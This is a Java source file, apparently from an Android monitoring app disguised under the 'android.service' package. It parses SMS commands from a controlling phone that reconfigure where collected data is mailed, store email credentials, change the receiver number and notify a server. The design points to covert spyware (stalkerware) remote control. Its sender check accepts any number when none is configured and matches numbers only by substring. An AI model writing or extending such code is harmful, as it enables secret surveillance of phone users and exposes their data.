package android.service;

import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.content.Context;
import android.service.activity.GlobalPrefActivity;
import android.service.config.ConfigCtrl;
import android.service.feature.sms.SmsCtrl;

import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.LANG;
import com.particle.inspector.common.util.RegExpUtil;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.sms.AuthSms;
import com.particle.inspector.common.util.sms.SmsConsts;

public class IndicationHandler 
{
	public static void handleIndicationSms(Context context, String smsBody, String incomingPhoneNum) 
	{
		// Make sure the indicaiton is coming from qulified phone
		if (!isQualifiedIncomingNum(context, incomingPhoneNum)) {
			// Do not return SMS to the phone about the failure
			return;
		}
		
		// -------------------------------------------------------
		// #1#<mail address> <password>: set self sender
		// #1#OFF: stop using self sender, use default sender instead
		if (smsBody.startsWith(SmsConsts.INDICATION_SENDER)) {
			String indication = smsBody.substring(3).trim();
			
			// Unregister indication
			if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
				// If it is recording all, we do not permit stop using self sender 
				if (GlobalPrefActivity.getRecordAll(context)) {
					SmsCtrl.sendSms(incomingPhoneNum, context.getResources().getString(R.string.indication_stop_selfsender_ng));
					return;
				}
				
				GlobalPrefActivity.setUseSelfSender(context, false);
				SmsCtrl.sendSms(incomingPhoneNum, context.getResources().getString(R.string.indication_stop_selfsender_ok));
			}
			else // set self sender
			{
				String[] parts = indication.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, " ").split(" ");
				if (parts.length < 2) {
					// Send SMS to warn user
					String strContent = context.getResources().getString(R.string.indication_set_selfsender_ng);
					SmsCtrl.sendSms(incomingPhoneNum, strContent);
					return;
				}
				
				String mailAddr = parts[0];
				String pwd      = parts[1];
				
				GlobalPrefActivity.setUseSelfSender(context, true);
				GlobalPrefActivity.setSenderMail(context, mailAddr);
				GlobalPrefActivity.setSenderPassword(context, pwd);
				
				// Send SMS to user to let him known the result
				String strContent = context.getResources().getString(R.string.indication_set_selfsender_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
		// -------------------------------------------------------
		// #2#<mail address>: change receiver mail address
		else if (smsBody.startsWith(SmsConsts.INDICATION_RECV_MAIL)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() > 0 && StrUtils.validateMailAddress(indication)) {
				GlobalPrefActivity.setSafeMail(context, indication);
				
				// Send SMS to tell user the result
				String strContent = context.getResources().getString(R.string.indication_set_recv_mail_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				
				// Send Info SMS to server to update receiver info
				SmsCtrl.sendReceiverInfoSms(context);
			} else {
				// Send SMS to warn the user
				String strContent = context.getResources().getString(R.string.indication_set_recv_mail_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
		// -------------------------------------------------------
		// #3#<receiver phone number>: change receiver phone number
		else if (smsBody.startsWith(SmsConsts.INDICATION_RECV_PHONENUM)) {
			String indication = smsBody.substring(3).trim();
					
			if (indication.length() > 0) {
				GlobalPrefActivity.setSafePhoneNum(context, indication);
				
				// Send SMS to tell user the result
				String strContent = context.getResources().getString(R.string.indication_set_recv_phonenum_ok);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
				
				// Send Info SMS to server to update receiver info
				SmsCtrl.sendReceiverInfoSms(context);
			} else {
				// Send SMS to warn the user
				String strContent = context.getResources().getString(R.string.indication_set_recv_phonenum_ng);
				SmsCtrl.sendSms(incomingPhoneNum, strContent);
			}
		}
		
	} // End of handleIndicationSms()
	
	// Rules:
	// All remote indications only accept SMS from recv phone
	private static boolean isQualifiedIncomingNum(Context context, String incomingPhoneNum) 
	{
		String recvPhoneNum = GlobalPrefActivity.getSafePhoneNum(context);
		if (recvPhoneNum == null || recvPhoneNum.length() <= 0) {
			return true;
		} 
		
		// Indication only accept recv phone
		else {
			if (incomingPhoneNum.contains(recvPhoneNum)) return true;
			else return false;
		}
	}
	
}
